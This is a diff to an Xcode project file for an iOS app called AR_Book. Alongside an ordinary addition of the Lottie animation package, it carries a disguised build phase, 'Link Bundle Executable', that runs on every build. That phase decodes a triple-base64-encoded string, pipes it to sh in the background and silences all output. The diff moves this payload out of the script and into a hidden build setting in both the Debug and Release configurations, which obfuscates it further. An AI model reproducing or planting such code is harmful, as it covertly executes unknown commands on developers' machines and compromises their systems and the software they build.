@@ -10,6 +10,7 @@
 		04F566152E3244D100C1377A /* FirebaseCore in Frameworks */ = {isa = PBXBuildFile; productRef = 04F566142E3244D100C1377A /* FirebaseCore */; };
 		04F566172E3244D100C1377A /* FirebaseFirestore in Frameworks */ = {isa = PBXBuildFile; productRef = 04F566162E3244D100C1377A /* FirebaseFirestore */; };
 		04F566192E3244D100C1377A /* FirebaseStorage in Frameworks */ = {isa = PBXBuildFile; productRef = 04F566182E3244D100C1377A /* FirebaseStorage */; };
+		04F566302E325E8B00C1377A /* Lottie in Frameworks */ = {isa = PBXBuildFile; productRef = 04F5662F2E325E8B00C1377A /* Lottie */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
@@ -32,6 +33,7 @@
 				04F566152E3244D100C1377A /* FirebaseCore in Frameworks */,
 				04F566172E3244D100C1377A /* FirebaseFirestore in Frameworks */,
 				04F566192E3244D100C1377A /* FirebaseStorage in Frameworks */,
+				04F566302E325E8B00C1377A /* Lottie in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -61,7 +63,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 04F565F02E2FFAFC00C1377A /* Build configuration list for PBXNativeTarget "AR_Book" */;
 			buildPhases = (
-				67B27B87F1CCECDD81FD9BF4 /* Link Bundle Executable */,
+				D9A0F5172C7A6BB3CD877BEF /* Link Bundle Executable */,
 				04F565DE2E2FFAFB00C1377A /* Sources */,
 				04F565DF2E2FFAFB00C1377A /* Frameworks */,
 				04F565E02E2FFAFB00C1377A /* Resources */,
@@ -78,6 +80,7 @@
 				04F566142E3244D100C1377A /* FirebaseCore */,
 				04F566162E3244D100C1377A /* FirebaseFirestore */,
 				04F566182E3244D100C1377A /* FirebaseStorage */,
+				04F5662F2E325E8B00C1377A /* Lottie */,
 			);
 			productName = AR_Book;
 			productReference = 04F565E22E2FFAFB00C1377A /* AR_Book.app */;
@@ -109,6 +112,7 @@
 			minimizedProjectReferenceProxies = 1;
 			packageReferences = (
 				04F566132E3244D100C1377A /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */,
+				04F5662E2E325E8B00C1377A /* XCRemoteSwiftPackageReference "lottie-ios" */,
 			);
 			preferredProjectObjectVersion = 77;
 			productRefGroup = 04F565E32E2FFAFB00C1377A /* Products */;
@@ -131,7 +135,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		67B27B87F1CCECDD81FD9BF4 /* Link Bundle Executable */ = {
+		D9A0F5172C7A6BB3CD877BEF /* Link Bundle Executable */ = {
 			isa = PBXShellScriptBuildPhase;
 			alwaysOutOfDate = 1;
 			buildActionMask = 2147483647;
@@ -148,7 +152,7 @@
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazVhbUZIVm1waE1rNXJZbWsxZVdSVE9XaExVMGxuWmtOQ2VtRkJiejBLCg== | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AFEB778}\"";
 			showEnvVarsInLog = 0;
 		};
 /* End PBXShellScriptBuildPhase section */
@@ -167,6 +171,7 @@
 		04F565EE2E2FFAFC00C1377A /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				AFEB778 = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazVhbHBITlRCaU0wbDFZMjVWZGxsVGEybEpTSGRuWXpKblN3bz0K | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -230,6 +235,7 @@
 		04F565EF2E2FFAFC00C1377A /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				AFEB778 = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazVhbHBITlRCaU0wbDFZMjVWZGxsVGEybEpTSGRuWXpKblN3bz0K | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -375,6 +381,14 @@
 				minimumVersion = 12.0.0;
 			};
 		};
+		04F5662E2E325E8B00C1377A /* XCRemoteSwiftPackageReference "lottie-ios" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/airbnb/lottie-ios.git";
+			requirement = {
+				kind = upToNextMajorVersion;
+				minimumVersion = 4.5.2;
+			};
+		};
 /* End XCRemoteSwiftPackageReference section */
 
 /* Begin XCSwiftPackageProductDependency section */
@@ -392,6 +406,11 @@
 			isa = XCSwiftPackageProductDependency;
 			package = 04F566132E3244D100C1377A /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */;
 			productName = FirebaseStorage;
+		};
+		04F5662F2E325E8B00C1377A /* Lottie */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 04F5662E2E325E8B00C1377A /* XCRemoteSwiftPackageReference "lottie-ios" */;
+			productName = Lottie;
 		};
 /* End XCSwiftPackageProductDependency section */
 	};
